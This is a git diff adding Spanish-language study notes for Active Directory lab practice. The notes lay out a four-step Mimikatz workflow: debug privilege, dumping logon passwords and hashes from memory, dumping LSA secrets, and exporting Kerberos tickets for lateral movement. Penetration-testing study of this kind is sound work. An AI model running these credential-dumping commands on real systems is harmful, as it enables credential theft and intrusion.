@@ -9,3 +9,10 @@ mimikatz
 privilege::debug
 sekurlsa::logonpasswords
 ```
+
+Cuando estés practicando estos días con las máquinas de Active Directory, acostúmbrate a este flujo rápido dentro de Mimikatz:
+
+1. `privilege::debug` -> ¿Tengo permisos?
+2. `sekurlsa::logonpasswords` -> ¿Hay credenciales de texto plano o hashes en la RAM de usuarios activos?
+3. `lsadump::secrets` -> ¿Hay cuentas de servicio con contraseñas hardcodeadas?
+4. `sekurlsa::tickets /export` -> ¿Hay algún ticket de Kerberos que pueda aprovechar para moverme lateralmente?
